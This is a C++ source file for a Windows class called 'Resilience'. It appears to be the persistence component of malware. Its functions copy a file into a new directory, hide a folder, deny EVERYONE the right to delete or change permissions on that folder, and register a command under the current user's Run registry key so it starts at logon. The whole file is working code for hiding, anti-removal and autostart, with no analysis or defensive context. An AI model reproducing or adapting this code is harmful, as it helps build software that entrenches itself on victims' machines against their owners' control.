#include "Resilience.h"

bool Resilience::Replicate(std::wstring filename, std::wstring newFilename) {
	std::wstring dir = newFilename.substr(0, newFilename.find_last_of(L'\\'));
	SHCreateDirectoryEx(NULL, dir.c_str(), NULL);

	return CopyFile(filename.c_str(), newFilename.c_str(), FALSE);
}

bool Resilience::HideFolder(std::wstring folder)
{
	SetFileAttributes(folder.c_str(), FILE_ATTRIBUTE_HIDDEN);
	return false;
}

bool Resilience::RemoveDeletePermissionFromFolder(std::wstring folder)
{
	PSECURITY_DESCRIPTOR pSID;
	PACL pDACL;
	if (!GetNamedSecurityInfo(folder.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDACL, NULL, &pSID)) {
		EXPLICIT_ACCESS desiredAccess = {0};
		BuildExplicitAccessWithName(&desiredAccess, (LPWSTR)L"EVERYONE", DELETE | WRITE_DAC | WRITE_OWNER, DENY_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
		PACL pNewDACL;
		if (!SetEntriesInAcl(1, &desiredAccess, pDACL, &pNewDACL)) {
			LocalFree(pSID);
			return !SetNamedSecurityInfo((LPWSTR)folder.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL);
		}		
	}
	LocalFree(pSID);
	return false;
}

bool Resilience::AddToAutorun(std::wstring filename, std::wstring name, std::vector<std::wstring> executionArguments)
{
	std::wstring cmd = executionArguments.size() == 0 ? filename : L'\"' + filename + L'\"' + L' ';
	for (int i = 0; i < executionArguments.size(); i++) {
		cmd +=  executionArguments[i] + L' ';
	}
	HKEY hKey;
	if (!RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
		return !RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (BYTE*)cmd.c_str(), (cmd.size() + 1) * sizeof(wchar_t));
	return false;
}
